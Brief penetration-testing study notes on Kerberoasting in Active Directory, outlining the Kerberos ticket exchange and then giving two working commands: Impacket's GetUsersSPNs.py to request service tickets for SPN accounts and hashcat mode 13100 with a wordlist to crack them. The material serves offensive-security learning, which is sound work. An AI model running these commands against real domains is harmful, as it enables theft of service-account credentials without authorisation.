- takes advantage of service accounts (SPN - Service Principal Name)
1. Request TGT w/ NTLM hash
2. Receive TGT encrypted w/ krbtgt hash
3. Request TGS for Server (Presents TGT)
4. Receive TGS encrypted w/ server account hash ==Part we care about ==

- KDC (Key Distriubution Center) aka DC

**Goal of Kerberoasting:**
	Get TGS and decrypt server's account hash

Step 1: Get SPNs, Dump Hash
```
python GetUsersSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request
```

Step 2: Crack the hash
```
hashcat -m 13100 kerberoast.txt rockyou.txt
```
